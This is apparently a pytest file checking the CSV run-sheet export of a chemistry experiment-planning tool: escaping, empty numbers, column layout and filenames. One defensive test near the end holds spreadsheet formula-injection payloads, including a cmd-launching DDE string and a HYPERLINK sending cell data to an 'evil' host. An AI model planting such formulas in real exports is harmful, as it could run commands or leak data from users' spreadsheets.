"""The run sheet as CSV.

The cases are the ones a naive comma-joining writer gets wrong: a comma, a quote, a newline, an
absent number, and a column order a chemist reads down.
"""

import csv
import io

from fastapi.routing import APIRoute

from chemclaw.protocols.export import run_sheet_csv, run_sheet_filename, run_sheet_path
from chemclaw.protocols.layout import place
from chemclaw.protocols.models import (
    ExperimentDesign,
    ExperimentRequest,
    Factor,
    FactorLevel,
    ProtocolArm,
    Setpoints,
)


def _request() -> ExperimentRequest:
    return ExperimentRequest(title="SM-3 Suzuki", goal="couple the aryl chloride")


def _parsed(text: str) -> list[list[str]]:
    """The CSV read back the way a spreadsheet reads it, which is the only assertion that counts."""
    return list(csv.reader(io.StringIO(text)))


def test_a_run_sheet_has_a_header_and_one_row_per_arm_in_run_order() -> None:
    """Run order, not arm order: the layout randomises against session drift and the sheet obeys it.

    A CSV that re-sorted would be a second opinion about the thing the layout exists to fix.
    """
    arms = [ProtocolArm(arm_id=f"A{n}") for n in range(1, 4)]
    design = ExperimentDesign(request=_request(), arms=arms, layout=place(arms, plate_format=24))

    rows = _parsed(run_sheet_csv(design))

    assert rows[0][:3] == ["arm_id", "well", "run_order"]
    assert len(rows) == 4
    assert [row[2] for row in rows[1:]] == ["1", "2", "3"]


def test_a_reagent_with_a_comma_in_its_name_does_not_shift_every_column() -> None:
    """A reagent with a comma in its name does not shift every column.

    "toluene, anhydrous" must stay one cell, which is why export goes through `csv.writer`.
    """
    design = ExperimentDesign(
        request=_request(),
        arms=[ProtocolArm(arm_id="A1", setpoints=Setpoints(solvent="toluene, anhydrous"))],
    )

    rows = _parsed(run_sheet_csv(design))
    header, row = rows[0], rows[1]

    assert len(row) == len(header), "a comma in a value must not add a column"
    assert row[header.index("solvent")] == "toluene, anhydrous"


def test_a_quote_and_a_newline_in_a_note_survive_the_round_trip() -> None:
    """The other two characters that break a naive writer, together.

    A note is free text a chemist typed; if it can contain a comma it can contain these.
    """
    note = 'ran "hot" overnight\nsecond line'
    design = ExperimentDesign(request=_request(), arms=[ProtocolArm(arm_id="A1", note=note)])

    rows = _parsed(run_sheet_csv(design))
    header, row = rows[0], rows[1]

    assert len(row) == len(header)
    assert row[header.index("note")] == note


def test_an_absent_number_is_an_empty_cell_and_never_the_word_none() -> None:
    """`None` written into a numeric column survives all the way to somebody weighing it out.

    Empty is what a spreadsheet and an instrument both read as "not set"; the literal string is
    what a naive `str()` produces and what nothing downstream handles.
    """
    design = ExperimentDesign(
        request=_request(),
        arms=[ProtocolArm(arm_id="A1", setpoints=Setpoints(temperature_c=None))],
    )

    rows = _parsed(run_sheet_csv(design))
    header, row = rows[0], rows[1]

    assert row[header.index("temperature_c")] == ""


def test_a_temperature_is_not_written_in_exponent_form() -> None:
    """`render._number` makes the same promise for the document, and a sheet is read the same way.

    A chemist scanning a column for 0.0001 M does not find `1e-04`, and an instrument parsing it
    may not either.
    """
    design = ExperimentDesign(
        request=_request(),
        arms=[ProtocolArm(arm_id="A1", setpoints=Setpoints(concentration_molar=0.0001))],
    )

    rows = _parsed(run_sheet_csv(design))
    header, row = rows[0], rows[1]

    assert row[header.index("concentration_molar")] == "0.0001"


def test_factor_levels_become_their_own_columns() -> None:
    """The one part of the shape a design decides rather than the model.

    A plate's whole point is that the factors vary, so a sheet that folded them into one cell would
    be unreadable exactly where it matters most.
    """
    factors = [
        Factor(
            name="ligand",
            kind="categorical",
            levels=[FactorLevel(label="XPhos"), FactorLevel(label="SPhos")],
        )
    ]
    arms = [
        ProtocolArm(arm_id="A1", levels={"ligand": "XPhos"}),
        ProtocolArm(arm_id="A2", levels={"ligand": "SPhos"}),
    ]
    design = ExperimentDesign(request=_request(), factors=factors, arms=arms)

    rows = _parsed(run_sheet_csv(design))
    header = rows[0]

    assert "ligand" in header
    assert [row[header.index("ligand")] for row in rows[1:]] == ["XPhos", "SPhos"]


def test_an_ask_with_no_protocol_yields_the_header_alone() -> None:
    """A true statement about the design rather than an error.

    An ask that has not been drafted into a protocol has no runs to sheet, and a caller asking for
    one is not making a mistake — it is asking a question whose honest answer is "none yet".
    """
    rows = _parsed(run_sheet_csv(ExperimentDesign(request=_request())))

    assert len(rows) == 1 and rows[0][0] == "arm_id"


def test_the_path_the_agent_quotes_is_the_path_the_route_serves() -> None:
    """Two spellings of one URL drift, and the one a model quotes is the one nobody tests.

    Asserted against the app's own route table rather than against a second literal here, which
    would be the third copy.
    """
    from chemclaw.api.app import create_app

    served = {route.path for route in create_app().routes if isinstance(route, APIRoute)}
    quoted = run_sheet_path("design-abc", 2)

    assert quoted.split("?")[0] == "/protocols/design-abc/run-sheet.csv"
    assert "/protocols/{design_id}/run-sheet.csv" in served


def test_a_saved_sheet_names_the_revision_it_is_of() -> None:
    """A sheet is printed and carried to a bench, where the design has already moved on."""
    assert run_sheet_filename("design-abc", 3) == "design-abc-r3-run-sheet.csv"
    assert run_sheet_filename("design-abc", 4) != run_sheet_filename("design-abc", 3)


def test_a_free_text_cell_cannot_reach_a_spreadsheet_as_a_formula() -> None:
    """A free-text cell cannot reach a spreadsheet as a formula.

    Spreadsheets evaluate a cell opening with `=`, `+`, `-`, `@`, a tab or a CR, and quoting does
    not prevent it; `solvent` and `note` are free text. An unprefixed number such as `-40` must stay
    a number for LIMS import.
    """
    design = ExperimentDesign(
        request=_request(),
        arms=[
            ProtocolArm(
                arm_id="A1",
                setpoints=Setpoints(solvent="@SUM(1+9)*cmd|'/C calc'!A0", temperature_c=-40.0),
                note='=HYPERLINK("http://evil/?"&A1,"x")',
            )
        ],
    )

    rows = _parsed(run_sheet_csv(design))
    header, arm = rows[0], rows[1]
    cell = dict(zip(header, arm, strict=True))

    assert cell["solvent"].startswith("'"), "a formula-triggering solvent reached the sheet live"
    assert cell["note"].startswith("'"), "a formula-triggering note reached the sheet live"
    assert cell["temperature_c"] == "-40", (
        "a negative number was prefixed, which corrupts the numeric column this export exists for"
    )


def test_a_factor_named_like_a_fixed_column_does_not_produce_two_columns_of_that_name() -> None:
    """A factor named like a fixed column does not produce two columns of that name.

    Readers disagree about which duplicate header is real, so a solvent screen would import blanks.
    Asserted as header uniqueness, not as the disambiguation's spelling.
    """
    factors = [
        Factor(
            name="solvent",
            kind="categorical",
            levels=[FactorLevel(label="THF"), FactorLevel(label="DMF")],
        )
    ]
    arms = [
        ProtocolArm(arm_id="A1", levels={"solvent": "THF"}),
        ProtocolArm(arm_id="A2", levels={"solvent": "DMF"}),
    ]
    design = ExperimentDesign(request=_request(), factors=factors, arms=arms)

    header = _parsed(run_sheet_csv(design))[0]

    assert len(header) == len(set(header)), f"the run sheet header repeats a column: {header}"
    assert "solvent" in header, "the fixed column keeps its name"
    assert any(name != "solvent" and "solvent" in name for name in header), (
        "the factor column must still be findable by a reader looking for the factor"
    )
